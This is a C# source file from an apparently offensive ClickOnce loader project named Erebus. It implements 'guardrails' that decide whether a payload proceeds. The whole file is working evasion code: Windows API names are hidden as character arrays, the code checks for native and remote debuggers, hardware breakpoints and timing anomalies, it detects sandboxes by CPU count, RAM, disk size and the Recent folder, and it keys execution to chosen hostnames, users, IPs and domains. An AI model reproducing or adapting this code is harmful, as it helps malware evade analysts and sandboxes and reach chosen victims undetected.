using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Collections.Generic;
using Erebus.ClickOnce.Evasion;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class Guardrails
    {
        // ===============================================================
        // D/Invoke-resolved native API wrappers. Delegate types are
        // defined inline; each call target is resolved lazily via
        // DynamicApi so the DLL and function names never appear in the
        // assembly's #Strings heap as plaintext. Call sites invoke the
        // property, which returns the cached delegate.
        // ===============================================================

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool FnIdp();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool FnCrdp(IntPtr hProcess, ref bool isDebuggerPresent);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr FnGcp();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr FnGct();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool FnGtc(IntPtr hThread, ref CONTEXT64 lpContext);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate int FnQip(
            IntPtr processHandle,
            int processInformationClass,
            ref IntPtr processInformation,
            uint processInformationLength,
            IntPtr returnLength);

        private static readonly Lazy<FnIdp> _isDbg =
            DynamicApi.LazyDelegate<FnIdp>(
                DynamicApi.Kernel32,
                new[] { 'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't' });

        private static readonly Lazy<FnCrdp> _chkRemote =
            DynamicApi.LazyDelegate<FnCrdp>(
                DynamicApi.Kernel32,
                new[] { 'C', 'h', 'e', 'c', 'k', 'R', 'e', 'm', 'o', 't', 'e', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't' });

        private static readonly Lazy<FnGcp> _getProc =
            DynamicApi.LazyDelegate<FnGcp>(
                DynamicApi.Kernel32,
                new[] { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's' });

        private static readonly Lazy<FnGct> _getThread =
            DynamicApi.LazyDelegate<FnGct>(
                DynamicApi.Kernel32,
                new[] { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'T', 'h', 'r', 'e', 'a', 'd' });

        private static readonly Lazy<FnGtc> _getCtx =
            DynamicApi.LazyDelegate<FnGtc>(
                DynamicApi.Kernel32,
                new[] { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' });

        private static readonly Lazy<FnQip> _ntQIP =
            DynamicApi.LazyDelegate<FnQip>(
                DynamicApi.Ntdll,
                new[] { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });

        private static FnIdp            IsDebuggerPresent          => _isDbg.Value;
        private static FnCrdp   CheckRemoteDebuggerPresent => _chkRemote.Value;
        private static FnGcp            GetCurrentProcess          => _getProc.Value;
        private static FnGct             GetCurrentThread           => _getThread.Value;
        private static FnGtc             GetThreadContext           => _getCtx.Value;
        private static FnQip    NtQueryInformationProcess  => _ntQIP.Value;

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi,
                          R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            // Floating-point + XMM state omitted - we only need debug regs.
            // Fixed-size buffer so CONTEXT struct size is roughly correct.
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2048)]
            public byte[] ExtendedRegisters;
        }

        private const uint CONTEXT_AMD64 = 0x00100000;
        private const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010;

        // ===============================================================
        // Anti-debugger checks
        // ===============================================================

        /// <summary>
        /// Detects both native debuggers (x64dbg, WinDbg, etc.) via the
        /// kernel32 IsDebuggerPresent P/Invoke AND managed debuggers
        /// (Visual Studio, dnSpy attach mode) via Debugger.IsAttached.
        /// Previously only checked the managed path, which missed native
        /// debuggers entirely.
        /// </summary>
        public static bool CheckIsDebuggerPresent()
        {
            try
            {
                if (IsDebuggerPresent())
                {
                    DebugLogger.WriteLine("[!] Native IsDebuggerPresent returned true");
                    return true;
                }
                if (Debugger.IsAttached)
                {
                    DebugLogger.WriteLine("[!] Managed Debugger.IsAttached returned true");
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error in CheckIsDebuggerPresent: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Detects an attached remote debugger via NtQueryInformationProcess
        /// (ProcessDebugPort). A non-zero debug port means a ring-3 debugger
        /// has attached to our process.
        /// </summary>
        public static bool CheckRemoteDebugger()
        {
            try
            {
                // Method 1: CheckRemoteDebuggerPresent (kernel32)
                bool isDebugged = false;
                if (CheckRemoteDebuggerPresent(GetCurrentProcess(), ref isDebugged) && isDebugged)
                {
                    DebugLogger.WriteLine("[!] CheckRemoteDebuggerPresent reported a debugger");
                    return true;
                }

                // Method 2: NtQueryInformationProcess ProcessDebugPort - less commonly hooked
                IntPtr debugPort = IntPtr.Zero;
                int status = NtQueryInformationProcess(
                    GetCurrentProcess(),
                    /* ProcessDebugPort */ 7,
                    ref debugPort,
                    (uint)IntPtr.Size,
                    IntPtr.Zero);
                if (status == 0 && debugPort != IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[!] ProcessDebugPort non-zero: {debugPort}");
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error in CheckRemoteDebugger: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Enumerates running processes and matches against the
        /// operator-supplied blocklist (InjectionConfig.BlockedProcesses,
        /// which is rendered from BuildParameter 0.5d-list at build time).
        /// </summary>
        public static bool CheckDebuggerProcesses(string[] blockedProcesses)
        {
            if (blockedProcesses == null || blockedProcesses.Length == 0)
                return false;

            try
            {
                var currentProcesses = Process.GetProcesses()
                    .Select(p => {
                        try { return p.ProcessName.ToLowerInvariant(); }
                        catch { return string.Empty; }
                    })
                    .Where(n => !string.IsNullOrEmpty(n))
                    .ToHashSet();

                foreach (var blocked in blockedProcesses)
                {
                    var target = blocked?.Trim().ToLowerInvariant();
                    if (string.IsNullOrEmpty(target)) continue;
                    if (currentProcesses.Contains(target))
                    {
                        DebugLogger.WriteLine($"[!] Blocked process detected: {blocked}");
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking debugger processes: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Reads the thread CONTEXT with CONTEXT_DEBUG_REGISTERS and checks
        /// whether any of Dr0–Dr3 have a corresponding enable bit set in
        /// Dr7 (bits 0/2/4/6 = Lx local-enable, bits 1/3/5/7 = Gx
        /// global-enable). This is the correct way to detect hardware
        /// breakpoints - the previous implementation just counted threads,
        /// which was a false-positive / false-negative heuristic.
        /// </summary>
        public static bool CheckHardwareBreakpoints()
        {
            try
            {
                CONTEXT64 ctx = new CONTEXT64
                {
                    ContextFlags = CONTEXT_DEBUG_REGISTERS,
                    ExtendedRegisters = new byte[2048],
                };

                if (!GetThreadContext(GetCurrentThread(), ref ctx))
                {
                    DebugLogger.WriteLine("[-] GetThreadContext failed, skipping HW breakpoint check");
                    return false;
                }

                // Dr7 enable bits: Dr0=bits 0|1, Dr1=bits 2|3, Dr2=bits 4|5, Dr3=bits 6|7
                bool dr0Active = ctx.Dr0 != 0 && (ctx.Dr7 & 0x3) != 0;
                bool dr1Active = ctx.Dr1 != 0 && (ctx.Dr7 & 0xC) != 0;
                bool dr2Active = ctx.Dr2 != 0 && (ctx.Dr7 & 0x30) != 0;
                bool dr3Active = ctx.Dr3 != 0 && (ctx.Dr7 & 0xC0) != 0;

                if (dr0Active || dr1Active || dr2Active || dr3Active)
                {
                    DebugLogger.WriteLine(
                        $"[!] HW breakpoint active - Dr0={ctx.Dr0:X} Dr1={ctx.Dr1:X} " +
                        $"Dr2={ctx.Dr2:X} Dr3={ctx.Dr3:X} Dr7={ctx.Dr7:X}");
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hardware breakpoints: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Measures the wall-clock delay of a short CPU-bound loop and
        /// compares against expected execution time. A debugger single-
        /// stepping through the loop inflates the duration massively.
        /// </summary>
        public static bool CheckTimingAnomalies()
        {
            try
            {
                var stopwatch = Stopwatch.StartNew();
                long sum = 0;
                for (int i = 0; i < 1_000_000; i++) sum += i;
                stopwatch.Stop();

                // A typical modern CPU runs this loop in < 10 ms. Even an
                // overburdened VM shouldn't exceed ~500 ms. 1000 ms is a
                // conservative threshold that still catches debuggers.
                if (stopwatch.ElapsedMilliseconds > 1000)
                {
                    DebugLogger.WriteLine($"[!] Timing anomaly - loop took {stopwatch.ElapsedMilliseconds} ms (sum={sum})");
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking timing anomalies: {ex.Message}");
                return false;
            }
        }

        // ===============================================================
        // Sandbox environment checks (mirror of the C++ loader's
        // CheckSandboxEnvironment in guardrails.cpp - CPU count, RAM,
        // disk, hypervisor bit, recent-activity).
        // ===============================================================

        public static bool CheckSandboxEnvironment()
        {
            try
            {
                // 1. CPU core count - sandbox VMs commonly run on 1 vCPU
                if (Environment.ProcessorCount < 2)
                {
                    DebugLogger.WriteLine($"[!] Sandbox - too few CPUs: {Environment.ProcessorCount}");
                    return true;
                }

                // 2. Total physical RAM - sandboxes typically cap at 1 – 2 GB
                long totalRamBytes = GetTotalPhysicalMemory();
                if (totalRamBytes > 0 && totalRamBytes < (2L * 1024 * 1024 * 1024 - 128L * 1024 * 1024))
                {
                    // <~ 1920 MB → sandbox (5 % slack vs 2 GB)
                    DebugLogger.WriteLine($"[!] Sandbox - too little RAM: {totalRamBytes}");
                    return true;
                }

                // 3. System drive size - sandboxes typically ship a ~40 GB disk
                try
                {
                    string systemDrive = Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\";
                    var drive = new DriveInfo(systemDrive);
                    long totalDiskBytes = drive.TotalSize;
                    if (totalDiskBytes < 60L * 1024 * 1024 * 1024)
                    {
                        DebugLogger.WriteLine($"[!] Sandbox - system drive too small: {totalDiskBytes}");
                        return true;
                    }
                }
                catch { /* best effort */ }

                // 4. Recent user activity - a real user has at least a few
                // items in %APPDATA%\Microsoft\Windows\Recent. Brand-new
                // sandbox VMs start with an empty or nearly-empty Recent
                // folder.
                try
                {
                    string recent = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        @"Microsoft\Windows\Recent");
                    if (Directory.Exists(recent))
                    {
                        int count = Directory.GetFiles(recent).Length;
                        if (count < 3)
                        {
                            DebugLogger.WriteLine($"[!] Sandbox - only {count} items in Recent folder");
                            return true;
                        }
                    }
                }
                catch { /* best effort */ }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error in CheckSandboxEnvironment: {ex.Message}");
                return false;
            }
        }

        private static long GetTotalPhysicalMemory()
        {
            try
            {
                // GC.GetGCMemoryInfo().TotalAvailableMemoryBytes is close
                // enough for a sandbox heuristic and doesn't need WMI.
                return GC.GetGCMemoryInfo().TotalAvailableMemoryBytes;
            }
            catch
            {
                return -1;
            }
        }

        // ===============================================================
        // List-based environment checks (already functional in the C# side
        // - kept as-is with minor hardening around the null / empty cases).
        // ===============================================================

        public static bool CheckHostnameWhitelist(string[] allowedHostnames)
        {
            if (allowedHostnames == null || allowedHostnames.Length == 0)
                return true;
            try
            {
                string host = Environment.MachineName.ToLowerInvariant();
                foreach (var allowed in allowedHostnames)
                {
                    if (!string.IsNullOrWhiteSpace(allowed) &&
                        host.Equals(allowed.Trim().ToLowerInvariant()))
                        return true;
                }
                DebugLogger.WriteLine($"[!] Hostname not in whitelist: {host}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hostname whitelist: {ex.Message}");
                return true;
            }
        }

        public static bool CheckHostnameBlacklist(string[] blockedHostnames)
        {
            if (blockedHostnames == null || blockedHostnames.Length == 0)
                return false;
            try
            {
                string host = Environment.MachineName.ToLowerInvariant();
                foreach (var blocked in blockedHostnames)
                {
                    if (!string.IsNullOrWhiteSpace(blocked) &&
                        host.Equals(blocked.Trim().ToLowerInvariant()))
                    {
                        DebugLogger.WriteLine($"[!] Blocked hostname: {host}");
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hostname blacklist: {ex.Message}");
                return false;
            }
        }

        public static bool CheckUsernameBlacklist(string[] blockedUsernames)
        {
            if (blockedUsernames == null || blockedUsernames.Length == 0)
                return false;
            try
            {
                string user = Environment.UserName.ToLowerInvariant();
                foreach (var blocked in blockedUsernames)
                {
                    if (!string.IsNullOrWhiteSpace(blocked) &&
                        user.Equals(blocked.Trim().ToLowerInvariant()))
                    {
                        DebugLogger.WriteLine($"[!] Blocked username: {user}");
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking username blacklist: {ex.Message}");
                return false;
            }
        }

        private static List<string> GetLocalIPAddresses()
        {
            var ips = new List<string>();
            try
            {
                foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork &&
                        ip.ToString() != "127.0.0.1")
                    {
                        ips.Add(ip.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error getting local IPs: {ex.Message}");
            }
            return ips;
        }

        public static bool CheckIPWhitelist(string[] allowedPrefixes)
        {
            if (allowedPrefixes == null || allowedPrefixes.Length == 0)
                return true;
            try
            {
                var localIPs = GetLocalIPAddresses();
                if (localIPs.Count == 0) return true;
                foreach (var ip in localIPs)
                {
                    foreach (var allowed in allowedPrefixes)
                    {
                        if (!string.IsNullOrWhiteSpace(allowed) &&
                            ip.StartsWith(allowed.Trim()))
                            return true;
                    }
                }
                DebugLogger.WriteLine($"[!] Local IP not in whitelist: {string.Join(", ", localIPs)}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking IP whitelist: {ex.Message}");
                return true;
            }
        }

        public static bool CheckIPBlacklist(string[] blockedPrefixes)
        {
            if (blockedPrefixes == null || blockedPrefixes.Length == 0)
                return false;
            try
            {
                var localIPs = GetLocalIPAddresses();
                foreach (var ip in localIPs)
                {
                    foreach (var blocked in blockedPrefixes)
                    {
                        if (!string.IsNullOrWhiteSpace(blocked) &&
                            ip.StartsWith(blocked.Trim()))
                        {
                            DebugLogger.WriteLine($"[!] Blocked IP: {ip}");
                            return true;
                        }
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking IP blacklist: {ex.Message}");
                return false;
            }
        }

        public static bool CheckDomainWhitelist(string[] allowedDomains)
        {
            if (allowedDomains == null || allowedDomains.Length == 0)
                return true;
            try
            {
                string domain = System.Net.NetworkInformation.IPGlobalProperties
                    .GetIPGlobalProperties().DomainName.ToLowerInvariant();
                foreach (var allowed in allowedDomains)
                {
                    if (string.IsNullOrWhiteSpace(allowed)) continue;
                    string a = allowed.Trim().ToLowerInvariant();
                    if (domain.Equals(a) || domain.EndsWith("." + a))
                        return true;
                }
                DebugLogger.WriteLine($"[!] Domain not in whitelist: {domain}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking domain whitelist: {ex.Message}");
                return true;
            }
        }

        // ===============================================================
        // Master dispatcher
        // ===============================================================

        public static bool RunGuardrails()
        {
            DebugLogger.WriteLine("[*] Running guardrail checks...\n");

            if (!InjectionConfig.GuardrailsEnabled)
            {
                DebugLogger.WriteLine("[*] Guardrails disabled, skipping");
                return true;
            }

            // Anti-debugger
            if (InjectionConfig.CheckDebugger && CheckIsDebuggerPresent())
            {
                DebugLogger.WriteLine("[-] Debugger detected");
                return false;
            }
            if (InjectionConfig.CheckRemoteDebugger && CheckRemoteDebugger())
            {
                DebugLogger.WriteLine("[-] Remote debugger detected");
                return false;
            }
            if (InjectionConfig.CheckDebuggerProcesses &&
                CheckDebuggerProcesses(InjectionConfig.BlockedProcesses))
            {
                DebugLogger.WriteLine("[-] Blocked debugger process detected");
                return false;
            }
            if (InjectionConfig.CheckHardwareBreakpoints && CheckHardwareBreakpoints())
            {
                DebugLogger.WriteLine("[-] Hardware breakpoint detected");
                return false;
            }
            if (InjectionConfig.CheckTiming && CheckTimingAnomalies())
            {
                DebugLogger.WriteLine("[-] Timing anomaly detected");
                return false;
            }
            if (InjectionConfig.CheckSandboxEnvironment && CheckSandboxEnvironment())
            {
                DebugLogger.WriteLine("[-] Sandbox environment detected");
                return false;
            }

            // Environment lists
            if (!CheckHostnameWhitelist(InjectionConfig.AllowedHostnames)) return false;
            if (CheckHostnameBlacklist(InjectionConfig.BlockedHostnames)) return false;
            if (CheckUsernameBlacklist(InjectionConfig.BlockedUsernames)) return false;
            if (!CheckIPWhitelist(InjectionConfig.AllowedIPs)) return false;
            if (CheckIPBlacklist(InjectionConfig.BlockedIPs)) return false;
            if (!CheckDomainWhitelist(InjectionConfig.AllowedDomains)) return false;

            DebugLogger.WriteLine("[+] All guardrail checks passed!\n");
            return true;
        }
    }
}
